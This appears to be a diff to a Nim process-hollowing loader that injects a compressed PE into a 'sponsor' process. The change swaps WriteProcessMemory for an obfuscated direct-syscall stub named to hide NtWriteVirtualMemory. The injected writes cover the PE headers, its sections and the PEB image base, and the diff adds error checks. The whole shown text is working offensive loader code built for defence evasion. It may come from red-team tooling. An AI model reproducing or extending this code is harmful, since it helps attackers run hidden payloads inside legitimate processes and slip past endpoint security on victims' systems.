@@ -206,34 +206,40 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
 
     # Copy PE headers to sponsor process 
     when not defined(release): echo "[*] Copying PE headers to sponsor process"    
-    WriteProcessMemory(
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         sponsorProcessHandle,
         peImageImageBase,
         peBytesPtr,
         peImageSizeOfHeaders,
         NULL
-    )
+    ) != 0:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit() 
 
     # Copy PE sections to sponsor process
     when not defined(release): echo "[*] Copying PE sections to sponsor process"    
     for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
-        WriteProcessMemory(
+        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
             sponsorProcessHandle,
             peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
             peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
             peImageSectionsHeader[i].SizeOfRawData,
             NULL
-        )
+        ) != 0:
+            when not defined(release): echo "[-] Could not write to sponsor process"
+            quit()
     
     # Overwrite sponsor PEB with the new image base address 
     when not defined(release): echo "[*] Overwriting PEB with the new image base address"
-    WriteProcessMemory(
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         sponsorProcessHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         addr peImageImageBase,
         8,
         NULL
-    )
+    ) != 0:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit()
 
     # Change sponsor thread Entrypoint
     var context: CONTEXT
